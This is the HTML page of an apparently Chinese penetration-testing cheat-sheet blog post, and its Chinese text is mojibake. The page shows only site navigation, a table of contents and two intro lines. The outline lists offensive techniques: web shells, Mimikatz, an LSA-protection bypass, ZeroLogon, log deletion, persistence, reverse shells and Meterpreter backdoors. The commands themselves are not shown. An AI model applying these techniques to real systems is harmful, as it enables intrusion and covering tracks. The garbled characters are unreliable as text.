<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>command æ¸—é€ä¸­å¸¸ç”¨å‘½ä»¤ | ming&#39;s blog</title>
  <meta name="keywords" content=" command ">
  <meta name="description" content="command æ¸—é€ä¸­å¸¸ç”¨å‘½ä»¤ | ming&#39;s blog">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="description" content="å®‰å…¨ç»ƒä¹ ç”Ÿï¼šæ¸—é€æµ‹è¯•ã€ä»£ç å®¡è®¡ã€åº”æ€¥å“åº”ã€æœåŠ¡åŠ å›ºç”¨äºè®°å½•ä¸€äº›å¸¸è§é—®é¢˜çš„è§£å†³æ–¹æ¡ˆï¼Œä»¥åŠä¸€äº›å­¦ä¹ è¿‡ç¨‹ä¸­çš„å¼¯å¼¯ç»•ç»•ã€‚">
<meta property="og:type" content="website">
<meta property="og:title" content="about">
<meta property="og:url" content="https://0x404ming.github.io/about/index.html">
<meta property="og:site_name" content="ming&#39;s blog">
<meta property="og:description" content="å®‰å…¨ç»ƒä¹ ç”Ÿï¼šæ¸—é€æµ‹è¯•ã€ä»£ç å®¡è®¡ã€åº”æ€¥å“åº”ã€æœåŠ¡åŠ å›ºç”¨äºè®°å½•ä¸€äº›å¸¸è§é—®é¢˜çš„è§£å†³æ–¹æ¡ˆï¼Œä»¥åŠä¸€äº›å­¦ä¹ è¿‡ç¨‹ä¸­çš„å¼¯å¼¯ç»•ç»•ã€‚">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2024-09-28T17:59:45.000Z">
<meta property="article:modified_time" content="2024-09-29T07:20:08.367Z">
<meta property="article:author" content="ming">
<meta name="twitter:card" content="summary">


<link rel="icon" href="/img/avatar.png">

<link href="/css/style.css?v=1.1.0" rel="stylesheet">

<link href="/css/hl_theme/atom-light.css?v=1.1.0" rel="stylesheet">

<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">

<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
<script src="/js/titleTip.js?v=1.1.0" ></script>

<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
<script>
    hljs.initHighlightingOnLoad();
</script>

<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>



<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>

<script src="/js/iconfont.js?v=1.1.0" ></script>

<meta name="generator" content="Hexo 7.3.0"></head>
<div style="display: none">
  <input class="theme_disqus_on" value="false">
  <input class="theme_preload_comment" value="">
  <input class="theme_blog_path" value="">
  <input id="theme_shortcut" value="true" />
  <input id="theme_highlight_on" value="true" />
  <input id="theme_code_copy" value="true" />
</div>



<body>
<aside class="nav">
    <div class="nav-left">
        <a href="/"
   class="avatar_target">
    <img class="avatar"
         src="/img/avatar.png"/>
</a>
<div class="author">
    <span>ming</span>
</div>

<div class="icon">
    
        
            <a title="rss"
               href="/atom.xml"
               target="_blank">
                
                    <svg class="iconfont-svg" aria-hidden="true">
                        <use xlink:href="#icon-rss"></use>
                    </svg>
                
            </a>
        
    
        
            <a title="github"
               href="https://github.com/0x404Ming"
               target="_blank">
                
                    <svg class="iconfont-svg" aria-hidden="true">
                        <use xlink:href="#icon-github"></use>
                    </svg>
                
            </a>
        
    
        
    
        
    
        
    
        
    
</div>





<ul>
    <li>
        <div class="all active" data-rel="All">All
            
                <small>(14)</small>
            
        </div>
    </li>
    
        
            
                
    <li>
        <div data-rel="å®¡è®¡">
            
            å®¡è®¡
            <small>(1)</small>
        </div>
        
    </li>

            
        
    
        
            
                
    <li>
        <div data-rel="æµ‹è¯•">
            <i class="fold iconfont icon-right"></i>
            æµ‹è¯•
            <small>(6)</small>
        </div>
        
            <ul class="sub hide">
                
                    
    <li>
        <div data-rel="æµ‹è¯•&lt;---&gt;ä»£ç†é…ç½®">
            
            ä»£ç†é…ç½®
            <small>(1)</small>
        </div>
        
    </li>

                
                    
    <li>
        <div data-rel="æµ‹è¯•&lt;---&gt;ç¯å¢ƒé…ç½®">
            
            ç¯å¢ƒé…ç½®
            <small>(2)</small>
        </div>
        
    </li>

                
                    
    <li>
        <div data-rel="æµ‹è¯•&lt;---&gt;cheatsheet">
            
            cheatsheet
            <small>(1)</small>
        </div>
        
    </li>

                
            </ul>
        
    </li>

            
        
    
        
            
                
    <li>
        <div data-rel="ç»ˆç«¯">
            
            ç»ˆç«¯
            <small>(7)</small>
        </div>
        
    </li>

            
        
    
        
            
        
    
        
            
        
    
        
            
        
    
</ul>
<div class="left-bottom">
    <div class="menus">
        
            
            
            
    </div>
    <div>
        
            <a class="about  hasFriend  site_url"
               
               href="/about">About</a>
        
        <a style="width: 50%"
                
                                           class="friends">Friends</a>
        
    </div>
</div>
<input type="hidden" id="yelog_site_posts_number" value="14">

<div style="display: none">
    <span id="busuanzi_value_site_uv"></span>
    <span id="busuanzi_value_site_pv"></span>
</div>

    </div>
    <div class="nav-right">
        <div class="friends-area">
    <div class="friends-title">
        Links
        <i class="iconfont icon-left"></i>
    </div>
    <div class="friends-content">
        <ul>
            
            <li><a target="_blank" href="http://yelog.org/">å¶è½é˜</a></li>
            
        </ul>
    </div>
</div>
        <div class="title-list">
    <div class="right-top">
        <div id="default-panel">
            <i class="iconfont icon-search" data-title="search shortcut key i"></i>
            <div class="right-title">All</div>
            <i class="iconfont icon-file-tree" data-title="switch to outline view shortcut key w"></i>
        </div>
        <div id="search-panel">
            <i class="iconfont icon-left" data-title="return"></i>
            <input id="local-search-input" autocomplete="off"/>
            <label class="border-line" for="input"></label>
            <i class="iconfont icon-case-sensitive" data-title="case sensitive"></i>
            <i class="iconfont icon-tag" data-title="label"></i>
        </div>
        <div id="outline-panel" style="display: none">
            <div class="right-title">outline</div>
            <i class="iconfont icon-list" data-title="switch to article list"></i>
        </div>
    </div>

    <div class="tags-list">
    <input id="tag-search" />
    <div class="tag-wrapper">
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>ä»£ç†</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>codeview</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>command</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>docker</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>git</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>maven</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>network</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>path</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>proxy</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>sqli</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>ssh</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>tools</a>
            </li>
        
    </div>

</div>

    
    <nav id="title-list-nav">
        
        
        <a  class="All æµ‹è¯• ç¯å¢ƒé…ç½® "
           href="/2024/09/30/docker/"
           data-tag="command,docker"
           data-author="" >
            <span class="post-title" title="docker å¸¸ç”¨æŒ‡ä»¤">docker å¸¸ç”¨æŒ‡ä»¤</span>
            <span class="post-date" title="2024-09-30 13:23:20">2024/09/30</span>
        </a>
        
        
        <a  class="All æµ‹è¯• ç¯å¢ƒé…ç½® "
           href="/2024/09/30/maven/"
           data-tag="maven,path"
           data-author="" >
            <span class="post-title" title="maven&amp;&amp;jdk ç¯å¢ƒé…ç½®">maven&amp;&amp;jdk ç¯å¢ƒé…ç½®</span>
            <span class="post-date" title="2024-09-30 12:30:31">2024/09/30</span>
        </a>
        
        
        <a  class="All æµ‹è¯• ä»£ç†é…ç½® "
           href="/2024/09/30/sshvpn/"
           data-tag="tools,proxy,ä»£ç†"
           data-author="" >
            <span class="post-title" title="ssh éš§é“ä»£ç†æŠ€æœ¯">ssh éš§é“ä»£ç†æŠ€æœ¯</span>
            <span class="post-date" title="2024-09-30 11:49:51">2024/09/30</span>
        </a>
        
        
        <a  class="All ç»ˆç«¯ "
           href="/2024/09/29/sshrsa/"
           data-tag="tools,ssh"
           data-author="" >
            <span class="post-title" title="ssh å…¬é’¥é…ç½®">ssh å…¬é’¥é…ç½®</span>
            <span class="post-date" title="2024-09-29 21:43:49">2024/09/29</span>
        </a>
        
        
        <a  class="All ç»ˆç«¯ "
           href="/2024/09/29/git/"
           data-tag="git,tools"
           data-author="" >
            <span class="post-title" title="git ç‰ˆæœ¬æ§åˆ¶å¸¸ç”¨å‘½ä»¤">git ç‰ˆæœ¬æ§åˆ¶å¸¸ç”¨å‘½ä»¤</span>
            <span class="post-date" title="2024-09-29 21:37:35">2024/09/29</span>
        </a>
        
        
        <a  class="All ç»ˆç«¯ "
           href="/2024/09/29/networkm/"
           data-tag="tools,network"
           data-author="" >
            <span class="post-title" title="network é…ç½®é™æ€ip+ç»ˆç«¯ä»£ç†">network é…ç½®é™æ€ip+ç»ˆç«¯ä»£ç†</span>
            <span class="post-date" title="2024-09-29 21:31:15">2024/09/29</span>
        </a>
        
        
        <a  class="All æµ‹è¯• "
           href="/2024/09/29/sqli/"
           data-tag="sqli"
           data-author="" >
            <span class="post-title" title="sqli sqlmapå·¥å…·å¸¸ç”¨å‚æ•°ç¤ºä¾‹">sqli sqlmapå·¥å…·å¸¸ç”¨å‚æ•°ç¤ºä¾‹</span>
            <span class="post-date" title="2024-09-29 21:14:19">2024/09/29</span>
        </a>
        
        
        <a  class="All ç»ˆç«¯ "
           href="/2024/09/29/jvms/"
           data-tag="tools"
           data-author="" >
            <span class="post-title" title="jvms windowsä¸‹Javaç‰ˆæœ¬åˆ‡æ¢">jvms windowsä¸‹Javaç‰ˆæœ¬åˆ‡æ¢</span>
            <span class="post-date" title="2024-09-29 19:41:00">2024/09/29</span>
        </a>
        
        
        <a  class="All ç»ˆç«¯ "
           href="/2024/09/29/jenv/"
           data-tag="tools"
           data-author="" >
            <span class="post-title" title="jenv linuxä¸‹Javaç‰ˆæœ¬åˆ‡æ¢">jenv linuxä¸‹Javaç‰ˆæœ¬åˆ‡æ¢</span>
            <span class="post-date" title="2024-09-29 19:27:27">2024/09/29</span>
        </a>
        
        
        <a  class="All ç»ˆç«¯ "
           href="/2024/09/29/vim/"
           data-tag="tools"
           data-author="" >
            <span class="post-title" title="vim å¸¸ç”¨å¿«æ·é”®">vim å¸¸ç”¨å¿«æ·é”®</span>
            <span class="post-date" title="2024-09-29 18:49:45">2024/09/29</span>
        </a>
        
        
        <a  class="All ç»ˆç«¯ "
           href="/2024/09/29/terminal/"
           data-tag="tools"
           data-author="" >
            <span class="post-title" title="tmux/screen å¸¸ç”¨æŒ‡ä»¤">tmux/screen å¸¸ç”¨æŒ‡ä»¤</span>
            <span class="post-date" title="2024-09-29 18:30:32">2024/09/29</span>
        </a>
        
        
        <a  class="All æµ‹è¯• cheatsheet "
           href="/2024/09/29/command-cheatsheet/"
           data-tag="command"
           data-author="" >
            <span class="post-title" title="command æ¸—é€ä¸­å¸¸ç”¨å‘½ä»¤">command æ¸—é€ä¸­å¸¸ç”¨å‘½ä»¤</span>
            <span class="post-date" title="2024-09-29 17:25:44">2024/09/29</span>
        </a>
        
        
        <a  class="All æµ‹è¯• "
           href="/2024/09/29/jsrpc-yakit/"
           data-tag="codeview"
           data-author="" >
            <span class="post-title" title="jsrpc+yakit ä¸ä¼šåšé¢˜è¿˜èƒ½å†™å‡ºæ­£ç¡®ç­”æ¡ˆ">jsrpc+yakit ä¸ä¼šåšé¢˜è¿˜èƒ½å†™å‡ºæ­£ç¡®ç­”æ¡ˆ</span>
            <span class="post-date" title="2024-09-29 02:59:21">2024/09/29</span>
        </a>
        
        
        <a  class="All å®¡è®¡ "
           href="/2024/09/29/codeview/"
           data-tag="codeview"
           data-author="" >
            <span class="post-title" title="ä»£ç å®¡è®¡æ¦‚è¿°">ä»£ç å®¡è®¡æ¦‚è¿°</span>
            <span class="post-date" title="2024-09-29 02:56:44">2024/09/29</span>
        </a>
        
        <div id="no-item-tips">

        </div>
    </nav>
    <div id="outline-list">
    </div>
</div>

    </div>
    <div class="hide-list">
        <div class="semicircle" data-title="Toggle full screen shortcut key s">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div id="post">
    <div class="pjax">
        <article id="post-command-cheatsheet" class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">command æ¸—é€ä¸­å¸¸ç”¨å‘½ä»¤</h1>
    
    <div class="article-meta">
        
        
        
        <span class="book">
            <i class="iconfont icon-category"></i>
            
            
            <a  data-rel="æµ‹è¯•">æµ‹è¯•</a> > 
            
            <a  data-rel="æµ‹è¯•&lt;---&gt;cheatsheet">cheatsheet</a>
            
        </span>
        
        
        <span class="tag">
            <i class="iconfont icon-tag"></i>
            
            <a class="color3">command</a>
            
        </span>
        
    </div>
    <div class="article-meta">
        
            Created At : <time class="date" title='Updated At: 2024-09-30 17:18:33'>2024-09-29 17:25</time>
        
    </div>
    <div class="article-meta">
        
        
        <span id="busuanzi_container_page_pv">
            Views ğŸ‘€ :<span id="busuanzi_value_page_pv">
                <span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </span>
        </span>
        
        
        <span class="top-comment" title="Jump to comment area">
            <a href="#comments">
                Comment:<span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </a>
        </span>
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#command"><span class="toc-text">command</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">javaå‘½ä»¤æ‰§è¡Œ</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%8C%E5%AE%9A%E4%BD%8D%E8%B5%84%E6%BA%90%E6%96%87%E4%BB%B6%E5%86%99%E6%96%87%E4%BB%B6%E5%9B%9E%E6%98%BE"><span class="toc-text">å‘½ä»¤æ‰§è¡Œï¼Œå®šä½èµ„æºæ–‡ä»¶å†™æ–‡ä»¶å›æ˜¾</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99shell"><span class="toc-text">å†™shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#windows%E6%89%93%E5%8C%85%E7%9B%AE%E5%BD%95"><span class="toc-text">windowsæ‰“åŒ…ç›®å½•</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8C%BF%E5%90%8D%E6%96%87%E4%BB%B6%E5%AD%98%E5%82%A8"><span class="toc-text">åŒ¿åæ–‡ä»¶å­˜å‚¨</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#nbtscan"><span class="toc-text">nbtscan</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dos%E5%91%BD%E4%BB%A4%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E6%8E%A2%E6%B5%8B"><span class="toc-text">doså‘½ä»¤å­˜æ´»ä¸»æœºæ¢æµ‹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap"><span class="toc-text">nmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#masscan"><span class="toc-text">masscan</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E5%88%97%E8%A1%A8"><span class="toc-text">ç«¯å£åˆ—è¡¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E5%85%B8"><span class="toc-text">å­—å…¸</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mimikatz"><span class="toc-text">Mimikatz</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#bypass-lsa-Protection-ppl"><span class="toc-text">bypass lsa Protection(ppl)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cs%E5%87%AD%E8%AF%81%E8%A7%A3%E6%9E%90"><span class="toc-text">cså‡­è¯è§£æ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bypass"><span class="toc-text">bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gobuster"><span class="toc-text">gobuster</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#dirsearch"><span class="toc-text">dirsearch</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7"><span class="toc-text">ä»£ç†å·¥å…·</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E5%B7%A5%E5%85%B7"><span class="toc-text">å†…ç½‘ç©¿é€å·¥å…·</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#fuso"><span class="toc-text">fuso</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#frp"><span class="toc-text">frp</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#nps"><span class="toc-text">nps</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#iox"><span class="toc-text">iox</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Stowaway"><span class="toc-text">Stowaway</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Venom"><span class="toc-text">Venom</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ssh"><span class="toc-text">ssh</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#grep%E6%90%9C%E7%B4%A2"><span class="toc-text">grepæœç´¢</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql"><span class="toc-text">mysql</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sqlmap"><span class="toc-text">sqlmap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-text">sqlæ³¨å…¥</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#mssql"><span class="toc-text">mssql</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#gitlab%E7%9B%B8%E5%85%B3"><span class="toc-text">gitlabç›¸å…³</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%BE%E5%8F%AF%E5%86%99%E7%9B%AE%E5%BD%95"><span class="toc-text">æ‰¾å¯å†™ç›®å½•</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hydra"><span class="toc-text">hydra</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#medusa"><span class="toc-text">medusa</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python%E4%BA%A4%E4%BA%92shell"><span class="toc-text">pythonäº¤äº’shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E4%BA%A4%E4%BA%92%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7"><span class="toc-text">æ— äº¤äº’æ·»åŠ ç”¨æˆ·</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#windows%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7"><span class="toc-text">windowsæ·»åŠ ç”¨æˆ·</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%E9%98%B2%E7%81%AB%E5%A2%99"><span class="toc-text">Windowsé˜²ç«å¢™</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#frp%E5%B8%B8%E7%94%A8%E9%85%8D%E7%BD%AE"><span class="toc-text">frpå¸¸ç”¨é…ç½®</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ZeroLogon"><span class="toc-text">ZeroLogon</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="toc-text">è·å–æ§åˆ¶å™¨</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A0rdp%E6%97%A5%E5%BF%97"><span class="toc-text">åˆ rdpæ—¥å¿—</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A0web%E6%97%A5%E5%BF%97"><span class="toc-text">åˆ webæ—¥å¿—</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%803389"><span class="toc-text">å¼€3389</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%90%9C%E7%B4%A2"><span class="toc-text">æ–‡ä»¶æœç´¢</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%97%A0%E5%9B%9E%E6%98%BE%E5%A4%96%E5%B8%A6oob"><span class="toc-text">å‘½ä»¤æ‰§è¡Œæ— å›æ˜¾å¤–å¸¦oob</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Windows"><span class="toc-text">Windows</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Linux"><span class="toc-text">Linux</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows%E7%9F%AD%E6%96%87%E4%BB%B6%E5%90%8D"><span class="toc-text">windowsçŸ­æ–‡ä»¶å</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#powershell%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD"><span class="toc-text">powershellæ–‡ä»¶ä¸‹è½½</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#certutil-exe%E4%B8%8B%E8%BD%BD"><span class="toc-text">certutil.exeä¸‹è½½</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bitsadmin"><span class="toc-text">bitsadmin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#wget-%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6"><span class="toc-text">wget ä¸‹è½½æ–‡ä»¶</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#curl-%E4%B8%8B%E8%BD%BD"><span class="toc-text">curl ä¸‹è½½</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-text">windowsæƒé™ç»´æŒ</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Startup%E7%9B%AE%E5%BD%95"><span class="toc-text">Startupç›®å½•</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E9%94%AE"><span class="toc-text">æ³¨å†Œé”®</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1"><span class="toc-text">æœåŠ¡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-text">è®¡åˆ’ä»»åŠ¡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WMI%E4%BA%8B%E4%BB%B6"><span class="toc-text">WMIäº‹ä»¶</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B1%8F%E5%B9%95%E4%BF%9D%E6%8A%A4"><span class="toc-text">å±å¹•ä¿æŠ¤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#bitsadmin-1"><span class="toc-text">bitsadmin</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Netsh%E7%99%BD%E5%8A%A0%E9%BB%91"><span class="toc-text">Netshç™½åŠ é»‘</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#MSDTC"><span class="toc-text">MSDTC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#windows%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-text">windowsä¿¡æ¯æ”¶é›†å¸¸ç”¨å‘½ä»¤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#at-schtasks-sc%E6%A8%AA%E5%90%91"><span class="toc-text">at&amp;schtasks&amp;scæ¨ªå‘</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#impacket%E5%8C%85%E6%A8%AA%E5%90%91%E5%91%BD%E4%BB%A4"><span class="toc-text">impacketåŒ…æ¨ªå‘å‘½ä»¤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell-%E6%B5%81%E9%87%8F%E5%A4%AA%E6%95%8F%E6%84%9F%EF%BC%8C%E5%B0%BD%E9%87%8F%E5%8A%A0%E5%AF%86%E7%94%A8"><span class="toc-text">åå¼¹shell(æµé‡å¤ªæ•æ„Ÿï¼Œå°½é‡åŠ å¯†ç”¨)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nc"><span class="toc-text">nc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bash"><span class="toc-text">bash</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#perl"><span class="toc-text">perl</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#python"><span class="toc-text">python</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#php"><span class="toc-text">php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ruby"><span class="toc-text">ruby</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nc-1"><span class="toc-text">nc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#java"><span class="toc-text">java</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lua"><span class="toc-text">lua</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#powershell"><span class="toc-text">powershell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A0%E5%AF%86shell"><span class="toc-text">åŠ å¯†shell</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#msf%E5%A4%A7%E5%85%A8"><span class="toc-text">msfå¤§å…¨</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-text">å®‰è£…</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Meterpreter%E5%9F%BA%E6%9C%AC%E5%91%BD%E4%BB%A4"><span class="toc-text">MeterpreteråŸºæœ¬å‘½ä»¤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-text">åŸºæœ¬ç³»ç»Ÿå‘½ä»¤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-text">æ–‡ä»¶ç³»ç»Ÿå‘½ä»¤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%91%BD%E4%BB%A4"><span class="toc-text">ç½‘ç»œå‘½ä»¤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">ä¿¡æ¯æ”¶é›†</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-text">ææƒ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E5%87%AD%E8%AF%81"><span class="toc-text">è·å–å‡­è¯</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%81%87%E5%86%92%E4%BB%A4%E7%89%8C"><span class="toc-text">å‡å†’ä»¤ç‰Œ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A4%8D%E5%85%A5%E5%90%8E%E9%97%A8"><span class="toc-text">æ¤å…¥åé—¨</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#cs%E5%A4%A7%E5%85%A8"><span class="toc-text">cså¤§å…¨</span></a></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="command"><a href="#command" class="headerlink" title="command"></a>command</h1><p>æ”¶é›†æ¸—é€ä¸­ä¼šç”¨åˆ°çš„å¸¸ç”¨å‘½ä»¤  ã€‚</p>
<p>å»ºè®®ç›´æ¥[Ctrl+F]æŸ¥æ‰¾    </p>
